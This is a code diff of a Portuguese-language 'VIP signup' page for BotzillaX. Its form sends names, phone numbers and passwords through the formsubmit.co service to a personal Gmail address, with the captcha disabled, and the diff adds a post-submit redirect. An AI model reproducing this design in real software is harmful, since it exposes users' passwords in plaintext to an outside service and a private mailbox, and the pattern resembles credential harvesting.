@@ -82,7 +82,7 @@
 </head>
 <body>
 
-  <form id="cadastro" action="https://formsubmit.co/natanaelverissimo34@gmail.com" method="POST" onsubmit="mostrarCarregando(event)">
+  <form action="https://formsubmit.co/natanaelverissimo34@gmail.com" method="POST" id="formulario">
     <h2>Cadastro VIP - BotzillaX</h2>
     <input type="text" name="nome" placeholder="Nome completo" required>
     <input type="tel" name="telefone" placeholder="Telefone" required>
@@ -90,8 +90,10 @@
     <input type="password" name="senha" placeholder="Senha" required>
     <input type="password" name="confirmar_senha" placeholder="Confirmar senha" required>
 
+    <!-- Configurações do FormSubmit -->
     <input type="hidden" name="_captcha" value="false">
     <input type="hidden" name="_template" value="table">
+    <input type="hidden" name="_next" value="https://botzillax.com/sucesso.html">
 
     <button type="submit">Cadastrar</button>
   </form>
@@ -102,24 +104,19 @@
   </div>
 
   <script>
-    function mostrarCarregando(event) {
-      event.preventDefault();
-      const form = document.getElementById('cadastro');
-      const final = document.getElementById('final');
-      const mensagem = document.getElementById('mensagem');
+    const form = document.getElementById("formulario");
+    const final = document.getElementById("final");
 
-      form.style.display = 'none';
-      final.style.display = 'flex';
-      mensagem.innerText = 'Processando seus dados...';
+    form.addEventListener("submit", function () {
+      form.style.display = "none";
+      final.style.display = "flex";
+      document.getElementById("mensagem").innerText = "Processando seus dados...";
 
       setTimeout(() => {
-        document.querySelector('.loader').style.display = 'none';
-        mensagem.innerHTML = '<h3>Cadastro realizado com sucesso!</h3>Um de nossos atendentes irá entrar em contato.';
+        document.querySelector(".loader").style.display = "none";
+        document.getElementById("mensagem").innerHTML = "<h3>Cadastro realizado com sucesso!</h3>Um de nossos atendentes irá entrar em contato.";
       }, 3000);
-
-      // Envia os dados
-      event.target.submit();
-    }
+    });
   </script>
 
 </body>
